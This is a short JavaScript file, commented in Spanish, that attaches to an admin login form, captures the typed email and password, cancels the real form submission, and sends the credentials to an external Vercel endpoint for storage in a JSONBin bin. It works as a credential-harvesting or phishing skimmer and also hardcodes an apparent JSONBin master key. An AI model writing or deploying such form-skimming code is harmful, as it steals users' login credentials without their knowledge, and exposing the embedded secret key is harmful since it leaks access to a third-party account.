const BIN_ID = '65ba84021f5677401f28f3cb';
const X_MASTER_KEY = '$2a$10$SPnSCePVMiT4fZnmd.DVkOYXTe9wOTGzhsevMfAVMbTaXoroZSa6y';
const VERCEL_APP_URL = 'https://brightpearl-test-jcjl4hl2o-mario-collas-projects.vercel.app';

function guardarDatos(data) {
    console.log('Guardando datos:', data);

    const url = `${VERCEL_APP_URL}/api/guardar`;  // Utilizamos la URL de la función serverless
    const headers = {
        'Content-Type': 'application/json',
        'Authorization': X_MASTER_KEY,
    };

    const requestOptions = {
        method: 'POST',
        headers: headers,
        body: JSON.stringify({
            binId: BIN_ID,
            data: data
        }),
    };

    fetch(url, requestOptions)
        .then(response => response.json())
        .then(json => console.log('Respuesta Vercel:', json))
        .catch(error => console.error('Error:', error));
}

// Temporalmente comentamos la llamada a guardarDatos
// Esta llamada se activaría cuando el formulario se envíe
$('#login-form-admin').submit(function (event) {
    event.preventDefault();

    // Recopila datos del formulario
    const email = $('#email_address_login').val();
    const password = $('#password').val();

    // Guarda datos utilizando la función
    guardarDatos({
        usuario: email,
        contraseña: password,
    });

    // Continúa con el envío del formulario si es necesario
    // Puedes redirigir o realizar otras acciones aquí
    // document.getElementById('login-form-admin').submit();
});
